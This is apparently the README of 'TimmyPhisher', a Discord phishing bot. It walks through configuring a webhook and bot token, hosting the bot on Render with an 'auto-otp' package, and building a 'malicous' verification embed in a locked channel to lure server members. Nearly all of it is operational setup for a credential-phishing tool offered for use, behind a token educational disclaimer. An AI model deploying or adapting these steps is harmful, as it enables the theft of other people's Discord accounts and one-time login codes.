# TimmyPhisher

> **Disclaimer:**
> This code is intended for educational purposes. Users are responsible for ensuring its ethical use and compliance with applicable laws. The author disclaims any liability for misuse or damages resulting from the code's application.

https://discord.gg/mFxdTZtbqT <<< Support

1. Begin by downloading the necessary files from the repository.

2. Extract the downloaded files and open the config.json file in a text editor of your choice (e.g., Notepad, Visual Studio Code, etc.).

3. Create a webhook on Discord by following these steps: Create a server, navigate to settings > Integrations, click on Create Webhook, and copy the generated webhook URL.

4. Go to https://discord.com/developers/applications and create a discord bot, copy the token and client id (remember to enable the 3 checkboxes under Privileged Gateway Intents).

5. Choose a domain-name you will put for your webapp later, this is IMPORTANT. Choose anything random (like https://myfunnybotstuff0.onrender.com), no one else will see this domain

8. Replace the existing content inside the config.json file with the stuff you just created.

9. Upload the modified files to a GitHub repository.

10. Head to dashboard.render.com, create a web service, and link it to your GitHub repository.
  
11. Keep most settings as default, but make the following adjustments:
  Build Command: npm i
  Start Command: node bot
> Building the application on Onrender will take a while due to the package respobsible for auto-otp.

12. Once the web app is live, go to https://discord.com/developers/applications/1186830876315758644/bot > OAuth2 and create a invite link. Enable commands and bot > admin access. (You may now invite the bot and use it however you desire, but remember that its your own responsibily)

# How to create a malicous Discord embed for the bot

Create a verification channel in your Discord server and ensure the premissions are set so users can't do these things:
  Send messages,
  React to messages,
  Create public threads,
  Create private threads

Do /embed [title] [description].

Once you press send, a Discord embed should apear.
